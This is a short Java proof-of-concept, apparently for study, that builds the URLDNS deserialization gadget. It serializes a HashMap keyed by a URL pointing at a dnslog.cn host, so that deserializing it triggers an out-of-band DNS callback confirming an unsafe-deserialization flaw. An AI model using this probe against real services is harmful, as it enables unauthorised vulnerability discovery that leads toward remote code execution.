import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class Main {
    public static void  serializable (String path, Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(path));
        oos.writeObject(obj);
    }
    public static Object deserialize(String path) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
        return ois.readObject();
    }

    public static void main(String[] args) throws Exception {
        URL url = new URL("http://ivg4na.dnslog.cn");
        Field hashCode = URL.class.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.setInt(url, 34);
        HashMap<URL, Object> map = new HashMap<>();
        map.put(new URL("http://ivg4na.dnslog.cn"),null);
        serializable("urldns.bin",map);
        deserialize("urldns.bin");
    }
}
